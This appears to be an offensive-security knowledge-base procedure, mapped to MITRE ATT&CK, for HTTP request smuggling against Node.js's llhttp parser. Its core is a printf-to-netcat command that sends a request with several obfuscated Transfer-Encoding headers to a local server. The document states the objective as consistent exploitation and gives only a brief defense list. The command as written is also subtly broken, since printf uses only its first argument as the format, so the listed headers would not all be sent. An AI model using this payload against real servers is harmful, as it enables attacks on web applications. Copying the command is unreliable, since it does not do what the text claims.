---
tags:
  - http-request-smuggling
  - variation
type: procedure
tools:
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/printf-nc-send-alternative-payload]]'
platforms:
  - Node.js
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6f8f00ab-3171-4bdf-b2dc-6525bdc1af9d
created_at: '2025-12-13T09:01:17.156Z'
updated_at: '2025-12-13T09:01:17.156Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test Alternative Malformed Payload

## Summary

This procedure tests an alternative payload with multiple Transfer-Encoding headers to further confirm the parsing vulnerability in Node.js llhttp.

## Description

The payload uses headers like 'Transfer-Encoding: yeet\r\n Transfer-Encoding: \n Transfer-Encoding: chunked' to obfuscate and verify wonky header parsing, leading to smuggling.

## Requirements

1. Running Node.js server on localhost:5000
2. Access to bash or similar shell
3. printf and nc tools available

## Defense

Defensive measures and detection strategies:

- Reject requests with multiple Transfer-Encoding headers
- Update to fixed Node.js versions

## Objectives

1. Validate vulnerability with variant payload
2. Observe combined header processing
3. Ensure consistent exploitation

## Instructions

### Step 1: Craft and Send Alternative Request

**Context**: Format the alternative malformed request and send it via netcat.

**Command** ([[commands/printf-nc-send-alternative-payload]]):

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " Transfer-Encoding: yeet\r\n" " Transfer-Encoding: \n" " Transfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

> This sends a request with multiple obfuscated headers to test parsing.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/printf-nc-send-alternative-payload]]

## Tools Used

- [[tools/printf]]
- [[tools/nc]]

## Tags

- [[http-request-smuggling]]
- [[variation]]
